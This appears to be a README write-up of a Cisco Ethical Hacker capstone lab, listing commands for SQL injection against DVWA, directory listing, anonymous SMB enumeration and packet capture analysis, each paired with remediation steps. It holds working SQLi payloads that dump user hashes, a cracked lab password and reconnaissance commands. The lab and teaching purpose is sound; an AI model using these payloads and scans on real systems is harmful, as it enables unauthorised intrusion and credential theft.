# Final-Capstone-Project
# 🛡️ Cisco Ethical Hacker Capstone – Commands & Remediation Guide

This repository documents the **Final Capstone Activity** from the Cisco Ethical Hacker course.  
It covers four penetration testing challenges, the exact commands used, and remediation steps.

---

## 📌 Lab Environment

| Challenge | Hostname       | IP Address       |
|-----------|----------------|------------------|
| DVWA SQLi | `dvwa.local`   | `192.168.56.101` |
| Web Vuln  | `webvuln.local`| `192.168.56.102` |
| SMB Vuln  | `smbvuln.local`| `192.168.56.103` |
| PCAP Lab  | `pcap.local`   | `192.168.56.104` |

---

## 🔥 Challenge 1 – SQL Injection (DVWA)

### Steps
```sql
' OR '1'='1 --
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT user,password,NULL FROM users --
Crack Bob’s hash → password: qwerty

SSH into target:

bash
ssh bob@192.168.56.101
ls -la
cat flag.txt
Remediation
Use prepared statements.

Restrict DB privileges.

Apply strong hashing (bcrypt/Argon2).

Deploy WAF rules for SQLi detection.
```

## 📂 Challenge 2 – Directory Listing
```Steps
bash
nikto -h http://192.168.56.102/
curl -s http://192.168.56.102/config/flag.txt
````
### Remediation
* Disable directory listing (Options -Indexes).

* Move configs outside web root.

* Restrict access with authentication.

* Automate scans with Nikto/ZAP.

## 📦 Challenge 3 – SMB Enumeration
```Steps
bash
nmap -sV -p 139,445 192.168.56.103
enum4linux -a 192.168.56.103
smbclient //192.168.56.103/print -N
# Inside smbclient
ls
get flag.txt
quit
cat flag.txt
````
### Remediation
* Disable guest access.

* Restrict shares to specific groups.

* Patch SMB services.

* Segment networks to limit exposure.

## Challenge 4 – Packet Capture Analysis
Steps
Open .pcap in Wireshark

Filter:

Code
http
ip.addr == 192.168.56.104 && http
http.request.method == "GET"
Follow HTTP stream → /data/flag.txt

```bash
curl -s http://192.168.56.104/data/flag.txt
```
### Remediation
* Enforce HTTPS/TLS.

* Restrict sensitive directories.

* Harden server configs.

* Monitor for cleartext leaks.

### 🛠 Quick Reference Commands
bash
### Nikto scan
```nikto -h http://192.168.56.102/```

### Nmap SMB scan
```nmap -sV -p 139,445 192.168.56.103```

### Enum4linux
````enum4linux -a 192.168.56.103````

### SMB client
`smbclient //192.168.56.103/print -N`

### SSH login
`ssh bob@192.168.56.101`

# Curl retrieval
`curl -s http://192.168.56.102/config/flag.txt`
`curl -s http://192.168.56.104/data/flag.txt`
